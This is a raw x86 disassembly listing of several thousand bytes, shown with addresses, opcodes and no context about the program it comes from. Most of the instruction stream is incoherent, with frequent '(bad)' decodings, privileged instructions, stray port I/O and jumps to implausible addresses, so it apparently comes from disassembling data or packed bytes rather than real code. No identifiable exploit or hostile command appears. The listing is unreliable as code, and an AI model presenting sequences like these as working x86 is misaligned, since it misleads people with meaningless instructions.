  429ea4:	pcmpgtw mm0,mm0
  429ea7:	add    dl,ah
  429ea9:	leave  
  429eaa:	mov    edi,DWORD PTR [esi-0x7d]
  429ead:	push   ax
  429eaf:	dec    ebp
  429eb0:	mov    esi,DWORD PTR [ebx-0x75]
  429eb3:	lea    ebp,[eax-0x7c00fffc]
  429eb9:	xor    eax,DWORD PTR [eax]
  429ebb:	sysret 
  429ebd:	dec    ebp
  429ebe:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  429ec5:	push   WORD PTR [ecx+0x8]
  429ec9:	jne    0x429e8c
  429ecb:	ud0    ecx,DWORD PTR [ecx]
  429ece:	mov    esi,DWORD PTR [edx]
  429ed0:	lods   al,BYTE PTR ds:[esi]
  429ed1:	add    BYTE PTR [eax],al
  429ed3:	data16 (bad) 
  429ed5:	iret   
  429ed6:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  429edd:	cli    
  429ede:	inc    ebp
  429edf:	cmp    al,0x8d
  429ee1:	add    BYTE PTR [esi+0x2d],ah
  429ee4:	inc    ebp
  429ee5:	pop    ebp
  429ee6:	lea    ecx,[edi]
  429ee8:	mov    dl,bh
  429eea:	add    BYTE PTR [edi],cl
  429eec:	mov    DWORD PTR [eax+eax*8],edi
  429eef:	mov    ebx,0x3a87
  429ef4:	add    BYTE PTR [ebx],ch
  429ef6:	inc    ebp
  429ef7:	data16 (bad) 
  429ef9:	clc    
  429efa:	int3   
  429efb:	cmp    eax,DWORD PTR [eax]
  429efd:	je     0x429e88
  429eff:	push   0xffffffc8
  429f01:	pop    edi
  429f02:	xchg   DWORD PTR [ebp+0x0],eax
  429f05:	data16 add BYTE PTR [ebp+0x45],cl
  429f09:	lea    cx,[ebp+0x10]
  429f0d:	jb     0x429f0f
  429f0f:	jmp    0x429e9a
  429f11:	call   eax
  429f13:	clc    
  429f14:	xchg   DWORD PTR [edi+0x1],edi
  429f17:	mov    eax,DWORD PTR [eax]
  429f19:	or     BYTE PTR [ebp-0x49],al
  429f1c:	lea    eax,[eax+0x74003154]
  429f22:	push   edi
  429f23:	inc    edx
  429f24:	jge    0x429f25
  429f26:	mov    DWORD PTR [edi],ecx
  429f28:	fdiv   DWORD PTR [edi-0x6]
  429f2b:	inc    DWORD PTR [eax]
  429f2d:	xor    edx,DWORD PTR [eax+0x5f]
  429f30:	xchg   DWORD PTR [ebx+0x1],ebx
  429f33:	ret    0x0
  429f36:	xor    BYTE PTR [ebp-0x51],cl
  429f39:	cmp    edi,0xf0ff8904
  429f3f:	data16 ror al,0x84
  429f43:	rol    BYTE PTR [eax],0x3b
  429f46:	add    al,dh
  429f48:	dec    eax
  429f49:	xchg   esp,eax
  429f4a:	push   ebx
  429f4b:	jmp    0x429ed8
  429f4d:	push   ebp
  429f4e:	add    esp,ebp
  429f50:	add    ebp,esp
  429f52:	mov    edx,DWORD PTR [edi+0x24]
  429f55:	clc    
  429f56:	dec    esi
  429f57:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  429f5d:	cmp    BYTE PTR [ebx],al
  429f5f:	jne    0x429eea
  429f61:	xor    esp,eax
  429f63:	jmp    0x45a0e6
  429f68:	add    ebp,DWORD PTR [ecx+ecx*4]
  429f6b:	jne    0x429f61
  429f6d:	call   0xffcc9cc7
  429f72:	clc    
  429f73:	xchg   edi,eax
  429f74:	sti    
  429f75:	add    DWORD PTR [ebx],eax
  429f77:	add    BYTE PTR [ebp+0x47],bl
  429f7a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429f80:	pop    ebp
  429f81:	mov    DWORD PTR [esi-0x48],esi
  429f84:	jmp    0x429fcd
  429f86:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  429f8c:	(bad)  
  429f8e:	cmp    al,0x0
  429f90:	cmp    eax,DWORD PTR [ebp+0x18]
  429f93:	lea    ebx,[ebp-0x56]
  429f96:	jle    0x429f98
  429f98:	jae    0x429f23
  429f9a:	mov    eax,esp
  429f9c:	call   0xb900:0x8b005587
  429fa3:	inc    ebp
  429fa4:	push   ebp
  429fa5:	lea    ecx,[ebp-0x27ff4f12]
  429fab:	mov    eax,edi
  429fad:	int3   
  429fae:	push   ebp
  429faf:	xchg   edi,eax
  429fb1:	add    esp,ebp
  429fb3:	add    BYTE PTR [eax],al
  429fb5:	inc    ebp
  429fb6:	add    BYTE PTR [ebp+0x8b3255],cl
  429fbc:	cld    
  429fbd:	mov    DWORD PTR [edx],edi
  429fbf:	aam    0x75
  429fc1:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  429fc7:	mov    DWORD PTR [ebx-0x50],edx
  429fca:	test   BYTE PTR [ebp-0x1],0xe8
  429fce:	mov    eax,DWORD PTR [eax]
  429fd0:	hlt    
  429fd1:	add    al,al
  429fd3:	mov    eax,DWORD PTR ds:0x890045a8
  429fd9:	dec    DWORD PTR [ebx+0x45fdf0e8]
  429fdf:	inc    DWORD PTR [eax*2+0xf75854d]
  429fe6:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  429fec:	call   0x7298fd2d
  429ff1:	je     0x42a051
  429ff3:	js     0x42a054
  429ff5:	lock ret 0x7e
  429ff9:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  429fff:	mov    edi,edi
  42a001:	sbb    al,bl
  42a003:	clc    
  42a004:	add    BYTE PTR [ebp-0x73],bh
  42a007:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  42a00d:	ror    BYTE PTR [eax],1
  42a00f:	dec    ebp
  42a010:	xchg   ebp,eax
  42a011:	mov    edi,edi
  42a013:	in     al,0x8b
  42a015:	jge    0x429fa0
  42a017:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  42a01d:	clc    
  42a01e:	pop    esi
  42a01f:	fist   DWORD PTR [ebp+0x5d398b5d]
  42a025:	clc    
  42a026:	add    al,0x6e
  42a028:	mov    eax,DWORD PTR [ebx]
  42a02a:	mov    BYTE PTR [ebp+0x0],dl
  42a02d:	mov    edx,DWORD PTR [ebx-0x20]
  42a030:	adc    esi,DWORD PTR [edi+0x5e005f36]
  42a036:	add    eax,0x3b3a73
  42a03b:	adc    al,0x89
  42a03d:	pop    eax
  42a03e:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  42a042:	ret    0xf08
  42a045:	cmp    al,0x2
  42a047:	mov    DWORD PTR [edx],esi
  42a049:	cld    
  42a04a:	add    BYTE PTR [ebp+0x66],dl
  42a04d:	add    eax,ebx
  42a04f:	add    esp,eax
  42a051:	sub    eax,eax
  42a053:	or     BYTE PTR [ecx-0x77f474bb],cl
  42a059:	add    BYTE PTR [eax],al
  42a05b:	mov    DWORD PTR [ebx-0x24],ebx
  42a05e:	push   edi
  42a05f:	push   ebp
  42a060:	clc    
  42a061:	add    DWORD PTR [esi+0x1b0100],0x45
  42a068:	out    0xff,eax
  42a06a:	add    edx,DWORD PTR [eax]
  42a06c:	jmp    0x42a056
  42a06e:	cmp    ch,0x43
  42a071:	(bad)  
  42a072:	jmp    0x40c828c4
  42a077:	je     0x42a003
  42a079:	mov    eax,DWORD PTR [eax-0x10c78704]
  42a07f:	inc    ebp
  42a080:	add    BYTE PTR [ebx-0x770375],al
  42a086:	add    ah,ch
  42a088:	add    edx,esp
  42a08a:	pop    edi
  42a08b:	pop    ebp
  42a08c:	push   ebp
  42a08d:	inc    ebx
  42a08e:	in     al,dx
  42a08f:	pop    ebp
  42a090:	in     al,dx
  42a091:	cmp    edx,DWORD PTR [edi-0x8]
  42a094:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  42a09b:	add    al,0x47
  42a09d:	push   ebp
  42a09e:	mov    esp,ebp
  42a0a0:	in     al,0x45
  42a0a2:	dec    ebp
  42a0a3:	push   esi
  42a0a4:	test   DWORD PTR [eax+0xff010f],esi
  42a0aa:	add    BYTE PTR [eax+0xc018b],dh
  42a0b0:	leave  
  42a0b1:	inc    ebp
  42a0b2:	test   al,ch
  42a0b4:	add    dh,bh
  42a0b6:	add    bh,bh
  42a0b8:	dec    ebp
  42a0b9:	push   cs
  42a0ba:	mov    DWORD PTR [ecx],eax
  42a0bc:	hlt    
  42a0bd:	push   es
  42a0be:	dec    ebp
  42a0bf:	leave  
  42a0c0:	mov    DWORD PTR [eax],ecx
  42a0c2:	clc    
  42a0c3:	cmovge eax,ecx
  42a0c6:	mov    ecx,0x85c2f0
  42a0cc:	clc    
  42a0cd:	pop    DWORD PTR [ebp+0x1]
  42a0d0:	aas    
  42a0d1:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  42a0d8:	push   esi
  42a0d9:	add    BYTE PTR [ebp-0x4],al
  42a0dc:	mov    DWORD PTR [eax],eax
  42a0de:	cld    
  42a0df:	inc    bp
  42a0e1:	add    DWORD PTR [edx],edi
  42a0e3:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  42a0eb:	mov    ebx,0xcd4f68
  42a0f0:	mov    edi,DWORD PTR [ebx]
  42a0f2:	or     al,0x75
  42a0f4:	(bad)  
  42a0f5:	xor    ecx,ebx
  42a0f7:	enterw 0x4d01,0x87
  42a0fc:	jmp    0x42a102
  42a101:	ret    
  42a102:	inc    ebp
  42a103:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  42a109:	add    dh,cl
  42a10b:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  42a113:	icebp  
  42a114:	or     BYTE PTR [eax+0x8f13bd2],al
  42a11a:	inc    ebp
  42a11b:	inc    edx
  42a11c:	mov    ecx,DWORD PTR [edx]
  42a11e:	or     al,0xf9
  42a120:	(bad)  
  42a121:	jne    0x42a0f1
  42a123:	mov    cl,0x0
  42a126:	rol    BYTE PTR [esi+0x450134],1
  42a12c:	add    eax,edi
  42a12e:	cld    
  42a12f:	ret    
  42a130:	dec    ebp
  42a131:	mov    ecx,DWORD PTR [edx+0x751c8583]
  42a137:	mov    edi,0xf82c8534
  42a13c:	jmp    0x42a1bb
  42a13e:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  42a144:	mov    dl,0x8b
  42a146:	sub    cl,BYTE PTR [eax]
  42a148:	mov    ecx,ecx
  42a14a:	in     al,dx
  42a14b:	test   cl,dh
  42a14d:	add    BYTE PTR [edx],al
  42a14f:	add    BYTE PTR [eax-0x377a97b3],al
  42a155:	cmovge esi,esp
  42a158:	add    eax,DWORD PTR [eax]
  42a15a:	cld    
  42a15b:	mov    eax,DWORD PTR [ecx]
  42a15d:	adc    BYTE PTR [ebp+0x4d],cl
  42a160:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  42a166:	xor    cl,BYTE PTR [ebx+0x4533082b]
  42a16c:	cmp    esp,ebx
  42a16e:	jne    0x42a10c
  42a170:	mov    eax,edi
  42a172:	adc    ah,ch
  42a174:	push   ebp
  42a175:	test   DWORD PTR [ebx],esi
  42a177:	clc    
  42a178:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  42a17e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  42a181:	dec    ebp
  42a182:	adc    bh,al
  42a184:	push   0x8b85ff10
  42a189:	clc    
  42a18a:	or     al,0x50
  42a18c:	(bad)  
  42a18d:	push   ecx
  42a18e:	retf   
  42a18f:	mov    ebx,0xff4d8dc8
  42a194:	mov    DWORD PTR [ebp+0x8],eax
  42a197:	xor    eax,DWORD PTR [ebp-0x75]
  42a19a:	cmp    ebp,DWORD PTR [ebx]
  42a19c:	lsl    ebx,WORD PTR [edi-0x8]
  42a1a0:	call   DWORD PTR [ebx-0x741bff75]
  42a1a6:	(bad)  
  42a1a7:	or     al,0x5b
  42a1a9:	dec    ebp
  42a1aa:	or     BYTE PTR [ebx],dh
  42a1ac:	inc    ebp
  42a1ad:	xor    esi,DWORD PTR ds:0x708088d
  42a1b3:	in     eax,0x98
  42a1b5:	add    BYTE PTR [edx],dh
  42a1b7:	inc    ebp
  42a1b8:	pop    edi
  42a1b9:	xor    eax,edx
  42a1bb:	test   DWORD PTR [eax],0x81108b8b
  42a1c1:	dec    ebp
  42a1c2:	sub    al,0x33
  42a1c4:	add    BYTE PTR [ebx],dh
  42a1c6:	push   esi
  42a1c7:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  42a1cd:	mov    edi,eax
  42a1cf:	or     BYTE PTR [ebp+0x45],al
  42a1d2:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  42a1d8:	cmp    cl,cl
  42a1da:	pushf  
  42a1db:	push   es
  42a1dc:	mov    DWORD PTR [ebx-0x4],0xf817853b
  42a1e3:	dec    ebp
  42a1e4:	inc    ebp
  42a1e5:	and    BYTE PTR [eax],0x50
  42a1e8:	pushf  
  42a1e9:	push   0x4de4d1c7
  42a1ee:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  42a1f4:	fsubr  st,st(1)
  42a1f6:	xlat   BYTE PTR ds:[ebx]
  42a1f7:	rol    bh,cl
  42a1f9:	mov    edx,esp
  42a1fb:	or     BYTE PTR [ebp+0x4588f84d],al
  42a201:	mov    ecx,DWORD PTR [eax]
  42a203:	or     BYTE PTR [eax],al
  42a205:	push   ebp
  42a206:	mov    edi,DWORD PTR [eax+0xfc728b]
  42a20c:	dec    ebp
  42a20d:	enter  0xceba,0x8
  42a211:	retf   0x1807
  42a214:	ret    0x984d
  42a217:	mov    esi,DWORD PTR [edx]
  42a219:	or     al,0x33
  42a21b:	into   
  42a21c:	add    edx,esi
  42a21e:	add    ecx,edx
  42a220:	bswap  eax
  42a222:	ror    esi,0x98
  42a225:	dec    ebp
  42a226:	add    cl,ch
  42a228:	mov    edi,edi
  42a22a:	hlt    
  42a22b:	inc    esi
  42a22d:	inc    ebp
  42a22e:	ret    0x4533
  42a231:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  42a237:	or     BYTE PTR [ebx],dh
  42a239:	dec    ebp
  42a23a:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  42a240:	jne    0xff8ca207
  42a246:	inc    ebp
  42a247:	inc    ebp
  42a248:	mov    esi,DWORD PTR [ebx]
  42a24a:	clc    
  42a24b:	pop    esi
  42a24c:	ret    0xcaeb
  42a24f:	mov    eax,esi
  42a251:	call   0x5203f324
  42a256:	dec    ebp
  42a257:	add    eax,0xf8728b
  42a25c:	adc    eax,0xce0ccac9
  42a261:	push   ebp
  42a262:	ret    0xc6ec
  42a265:	in     al,dx
  42a266:	call   0x3342ef6f
  42a26b:	push   edi
  42a26c:	add    edi,eax
  42a26e:	xor    eax,eax
  42a270:	jmp    0x42a2b7
  42a272:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a278:	add    eax,edi
  42a27a:	shr    eax,cl
  42a27c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a282:	mov    edi,DWORD PTR [ecx]
  42a284:	in     al,dx
  42a285:	pushf  
  42a286:	ret    0x84c7
  42a289:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a28f:	inc    ebp
  42a290:	in     al,dx
  42a291:	cmp    BYTE PTR [ebp-0x64],al
  42a294:	mov    eax,edi
  42a296:	cld    
  42a297:	fmul   st(2),st
  42a299:	sbb    dl,al
  42a29b:	jmp    0x9c3b:0x374d45c1
  42a2a2:	jbe    0x42a26b
  42a2a4:	mov    esp,eax
  42a2a6:	clc    
  42a2a7:	add    BYTE PTR [ebp+0x0],cl
  42a2aa:	mov    ecx,ecx
  42a2ac:	lea    eax,[ebp-0x5]
  42a2af:	mov    edi,edi
  42a2b1:	call   0x51cdf2fb
  42a2b6:	hlt    
  42a2b7:	xor    eax,edx
  42a2b9:	mov    esi,0x987284
  42a2be:	xor    cl,dl
  42a2c0:	mov    esi,eax
  42a2c2:	hlt    
  42a2c3:	into   
  42a2c4:	inc    ebp
  42a2c5:	scas   eax,DWORD PTR es:[edi]
  42a2c6:	mov    ebp,ecx
  42a2c8:	cld    
  42a2c9:	add    dl,cl
  42a2cb:	add    dl,al
  42a2cd:	inc    ebp
  42a2ce:	shr    DWORD PTR [ebx],0x4d
  42a2d1:	xor    edi,DWORD PTR [ebx]
  42a2d3:	mov    DWORD PTR [edi],ecx
  42a2d5:	clc    
  42a2d6:	dec    esi
  42a2d7:	inc    ebp
  42a2d8:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a2de:	ret    0xc6ca
  42a2e1:	mov    BYTE PTR [ebp-0x32],0x53
  42a2e5:	scas   eax,DWORD PTR es:[edi]
  42a2e6:	inc    ebp
  42a2e7:	jmp    0x42a320
  42a2e9:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a2f0:	pop    ebx
  42a2f1:	xor    ecx,DWORD PTR [ebp+0x3]
  42a2f4:	mov    eax,DWORD PTR [ebx]
  42a2f6:	clc    
  42a2f7:	test   edx,ecx
  42a2f9:	mov    ecx,esi
  42a2fb:	cld    
  42a2fc:	call   0x8ab6e846
  42a301:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a307:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a30d:	fdiv   QWORD PTR [ebx]
  42a30f:	retf   0xce89
  42a312:	in     al,0xc1
  42a314:	inc    ebp
  42a315:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a31b:	into   
  42a31c:	mov    dh,0xc1
  42a31f:	call   0x8c16e8a8
  42a324:	(bad)  
  42a325:	cld    
  42a326:	mov    ecx,DWORD PTR [ebp-0x14]
  42a329:	xor    eax,ecx
  42a32b:	lea    eax,[ebp+0x8]
  42a32e:	mov    esi,DWORD PTR [edx-0x4]
  42a331:	add    dl,al
  42a333:	inc    ebp
  42a334:	mov    esp,0x32d8988b
  42a339:	dec    ebp
  42a33a:	mov    esi,DWORD PTR [ebx]
  42a33c:	cld    
  42a33d:	xor    eax,edx
  42a33f:	sub    ebp,DWORD PTR [eax-0x75]
  42a342:	int    0xec
  42a344:	sub    ecx,eax
  42a346:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a34c:	mov    esi,esp
  42a34e:	call   0x3416f0d7
  42a353:	inc    DWORD PTR [ebx]
  42a355:	mov    edi,DWORD PTR [ebx]
  42a357:	cld    
  42a358:	jne    0x42a3a7
  42a35a:	mov    esi,DWORD PTR [ebx]
  42a35c:	aam    0x8d
  42a35e:	dec    ebp
  42a35f:	or     BYTE PTR [ebx],dh
  42a361:	jb     0x42a366
  42a363:	add    BYTE PTR [edi+0x45],bl
  42a366:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a36d:	xor    ebp,esp
  42a36f:	xor    eax,edi
  42a371:	sub    edi,esp
  42a373:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a379:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a380:	inc    ebp
  42a381:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a387:	clc    
  42a388:	mov    eax,edi
  42a38a:	nop
  42a38b:	fadd   QWORD PTR [eax]
  42a38d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a393:	jmp    0x42a31e
  42a395:	mov    eax,DWORD PTR [ecx]
  42a397:	fadd   DWORD PTR [eax]
  42a399:	inc    ebp
  42a39a:	or     DWORD PTR [ebx],esi
  42a39c:	dec    eax
  42a39d:	add    edx,DWORD PTR [ebx-0x2d]
  42a3a0:	dec    ebp
  42a3a1:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a3a7:	inc    ebp
  42a3a8:	push   eax
  42a3a9:	mov    dl,BYTE PTR [ecx-0xd]
  42a3ac:	xor    ecx,DWORD PTR [ebp-0x45]
  42a3af:	(bad)  
  42a3b1:	rol    BYTE PTR [eax],0xc1
  42a3b4:	ret    
  42a3b5:	inc    ebp
  42a3b6:	inc    ebp
  42a3b7:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a3bd:	xor    eax,ebx
  42a3bf:	add    eax,DWORD PTR [ebp+0x23]
  42a3c2:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a3c8:	cmp    edi,0xc
  42a3cb:	dec    ebp
  42a3cc:	inc    ebp
  42a3cd:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a3d3:	inc    ebp
  42a3d4:	mov    esi,DWORD PTR [ebx]
  42a3d6:	clc    
  42a3d7:	lea    eax,[ebp+0x45725407]
  42a3dd:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a3e1:	xor    edi,DWORD PTR [eax]
  42a3e3:	mov    ecx,0xff8b8d4d
  42a3e8:	push   esp
  42a3e9:	enter  0x4df7,0x23
  42a3ed:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a3f3:	mov    eax,DWORD PTR [ebx]
  42a3f5:	loopne 0x42a3e2
  42a3f7:	ret    0xc68b
  42a3fa:	push   esp
  42a3fb:	enter  0x9745,0x8b
  42a3ff:	inc    ebp
  42a400:	cld    
  42a401:	mov    eax,edi
  42a403:	clc    
  42a404:	ret    
  42a405:	ret    0xc645
  42a408:	mov    esi,DWORD PTR [ebx]
  42a40a:	cld    
  42a40b:	pop    esi
  42a40c:	mov    ebx,0x83458bc3
  42a412:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a416:	dec    ebp
  42a417:	cmp    BYTE PTR [ebx],dh
  42a419:	pushf  
  42a41a:	add    edi,DWORD PTR [edx-0x7767a77]
  42a420:	fcom   DWORD PTR [ebp+0x45]
  42a423:	mov    edi,DWORD PTR [edx]
  42a425:	adc    al,0x9c
  42a427:	inc    ebp
  42a428:	(bad)  
  42a429:	mov    ebx,eax
  42a42b:	adc    al,0x85
  42a42d:	cmp    al,0x1
  42a430:	inc    ebp
  42a431:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a438:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a43e:	xor    eax,DWORD PTR [ebx]
  42a440:	add    edi,DWORD PTR [ecx+ecx*4]
  42a443:	mov    esp,esi
  42a445:	clc    
  42a446:	inc    ebp
  42a447:	inc    ebp
  42a448:	add    edx,DWORD PTR [esi+0xc]
  42a44b:	mov    edi,0x7ff0845
  42a450:	in     al,dx
  42a451:	(bad)  
  42a452:	jne    0x42a3ec
  42a454:	mov    esi,DWORD PTR [edx]
  42a456:	clc    
  42a457:	add    ebp,DWORD PTR [edx]
  42a459:	mov    edi,edi
  42a45b:	in     al,dx
  42a45c:	mov    DWORD PTR [ebp-0x10],eax
  42a45f:	xor    eax,DWORD PTR [ebp+0x3]
  42a462:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a468:	fmul   DWORD PTR [ebx-0x173caf39]
  42a46e:	lea    ecx,[ecx+0x45e8d4bc]
  42a474:	clc    
  42a475:	mov    edi,edi
  42a477:	cmp    BYTE PTR [ebp+0x4d],al
  42a47a:	test   DWORD PTR [eax+0x74],ecx
  42a47d:	inc    ecx
  42a47e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a484:	ret    
  42a485:	inc    eax
  42a486:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a48c:	push   eax
  42a48d:	dec    eax
  42a48e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a48f:	sar    bh,1
  42a491:	enter  0x458b,0xec
  42a495:	mov    eax,DWORD PTR [ebp+0x38]
  42a498:	mov    eax,ecx
  42a49a:	fadd   DWORD PTR [ebx]
  42a49c:	dec    ebp
  42a49d:	inc    eax
  42a49e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a4a4:	inc    ebp
  42a4a5:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a4ab:	fadd   QWORD PTR [ebx]
  42a4ad:	inc    ebp
  42a4ae:	or     al,0x33
  42a4b0:	dec    ebp
  42a4b1:	add    edi,DWORD PTR [ebx]
  42a4b3:	mov    DWORD PTR [edx-0x28],esi
  42a4b6:	mov    eax,DWORD PTR [ebp-0x10]
  42a4b9:	mov    eax,DWORD PTR [eax+0x10]
  42a4bc:	mov    eax,edi
  42a4be:	lock ret 
  42a4c0:	inc    ecx
  42a4c1:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a4c7:	fsubr  st,st(5)
  42a4c9:	test   DWORD PTR [eax],eax
  42a4cb:	clc    
  42a4cc:	push   0x45
  42a4ce:	(bad)  
  42a4cf:	cmp    ebp,esp
  42a4d1:	pushf  
  42a4d2:	inc    ebp
  42a4d3:	(bad)  
  42a4d4:	push   eax
  42a4d5:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a4d9:	clc    
  42a4da:	mov    eax,0xf8008584
  42a4df:	mov    eax,DWORD PTR [ebp-0x4]
  42a4e2:	mov    edi,0x4585c3cc
  42a4e8:	clc    
  42a4e9:	mov    eax,DWORD PTR [ebp+0x14]
  42a4ec:	cmp    al,BYTE PTR [ebp-0x64]
  42a4ef:	mov    edi,eax
  42a4f1:	in     al,dx
  42a4f2:	les    esi,FWORD PTR [ebp-0x7b]
  42a4f5:	mov    edi,eax
  42a4f7:	or     al,0x4d
  42a4f9:	dec    ebp
  42a4fa:	mov    eax,ebp
  42a4fc:	in     al,0xf2
  42a4fe:	dec    ebp
  42a4ff:	dec    DWORD PTR [ecx+0x4dc7e045]
  42a505:	fmul   DWORD PTR [ecx+0x4df8f085]
  42a50b:	inc    ebp
  42a50c:	mov    DWORD PTR [ebx],esi
  42a50e:	fadd   QWORD PTR [ebx]
  42a510:	dec    ebp
  42a511:	push   eax
  42a512:	xor    eax,DWORD PTR [ebp+0x3]
  42a515:	push   eax
  42a516:	mov    DWORD PTR [eax],ebx
  42a518:	fdivr  st,st(7)
  42a51a:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42a521:	dec    esi
  42a522:	clc    
  42a523:	inc    ebp
  42a524:	test   BYTE PTR [ebx],dh
  42a526:	add    DWORD PTR [ebx],eax
  42a528:	add    BYTE PTR [eax+0x4d],dl
  42a52b:	jne    0x42a560
  42a52d:	lea    ecx,[ebx-0x7617fc44]
  42a533:	div    ah
  42a535:	inc    DWORD PTR [ebp+0x45]
  42a538:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42a53e:	jb     0x42a4cb
  42a540:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42a547:	mov    ecx,DWORD PTR [ebp-0x10]
  42a54a:	xor    ecx,DWORD PTR [ebp+0x3]
  42a54d:	mov    edi,DWORD PTR [ebx]
  42a54f:	adc    BYTE PTR [ebp+0x41],dh
  42a552:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42a558:	ret    
  42a559:	push   ss
  42a55a:	push   0x45
  42a55c:	lea    ecx,[ebx+0x4de80cb0]
  42a562:	sti    
  42a563:	add    edi,edi
  42a565:	or     BYTE PTR [ebp+0x4d],al
  42a568:	mov    ebp,DWORD PTR [ebx]
  42a56a:	xor    ebp,ecx
  42a56c:	mov    al,BYTE PTR [edx]
  42a56e:	add    eax,0xc7200
  42a573:	jne    0x42a5c2
  42a575:	lea    esi,[ebx]
  42a577:	mov    al,0xf
  42a579:	call   0xe9c3e
  42a57e:	sar    DWORD PTR [eax],0x84
  42a581:	pushf  
  42a582:	add    DWORD PTR [ecx+0x4545d000],ecx
  42a588:	mov    edi,DWORD PTR [ecx]
  42a58a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42a591:	test   DWORD PTR [eax],eax
  42a593:	clc    
  42a594:	dec    ebp
  42a595:	inc    ebp
  42a596:	xor    edi,DWORD PTR [ebx]
  42a598:	setl   al
  42a59b:	(bad)  
  42a59c:	retf   
  42a59d:	rol    cl,1
  42a59f:	dec    ebp
  42a5a0:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42a5a6:	inc    ebp
  42a5a7:	lea    ecx,[ebx-0x75b2cc38]
  42a5ad:	lea    eax,ds:0x4d72c4
  42a5b3:	mov    ecx,DWORD PTR [ebp-0x4]
  42a5b6:	xor    ecx,edi
  42a5b8:	bswap  ebx
  42a5ba:	ror    BYTE PTR [ebp-0x35],0xe9
  42a5be:	rol    DWORD PTR [ecx],0x84
  42a5c1:	add    BYTE PTR [ecx],al
  42a5c3:	cmp    al,BYTE PTR [eax]
  42a5c5:	pushf  
  42a5c6:	inc    ebp
  42a5c7:	jnp    0x8a42d9ca
  42a5cd:	mov    eax,DWORD PTR ds:0xcf72e8
  42a5d3:	lock dec ebp
  42a5d5:	retf   
  42a5d6:	xor    ecx,DWORD PTR [ebp+0xf]
  42a5d9:	mov    eax,eax
  42a5db:	fmul   st,st(3)
  42a5dd:	test   ecx,0x1988484
  42a5e3:	xor    al,BYTE PTR [eax]
  42a5e5:	mov    DWORD PTR [ebp-0x28],eax
  42a5e8:	mov    eax,DWORD PTR [ebp+0x33]
  42a5eb:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42a5f1:	ret    
  42a5f2:	add    al,cl
  42a5f4:	dec    ebp
  42a5f5:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42a5fb:	add    ecx,DWORD PTR ds:0xc7250
  42a601:	inc    ebp
  42a602:	rcl    DWORD PTR [eax+0x4d],0x27
  42a606:	mov    edi,edi
  42a608:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42a60e:	jb     0x42a5d7
  42a610:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42a617:	mov    esi,DWORD PTR [ebx]
  42a619:	cld    
  42a61a:	mov    cl,bh
  42a61c:	or     eax,0x372b6
  42a621:	cmp    ecx,eax
  42a623:	jne    0x42a6a0
  42a629:	mov    eax,DWORD PTR [ebp-0x20]
  42a62c:	mov    eax,DWORD PTR [eax]
  42a62e:	xor    eax,edi
  42a630:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42a637:	mov    ecx,DWORD PTR [ebp-0x4]
  42a63a:	mov    ecx,edi
  42a63c:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a642:	jb     0x42a653
  42a644:	add    BYTE PTR [edi-0x3f],dl
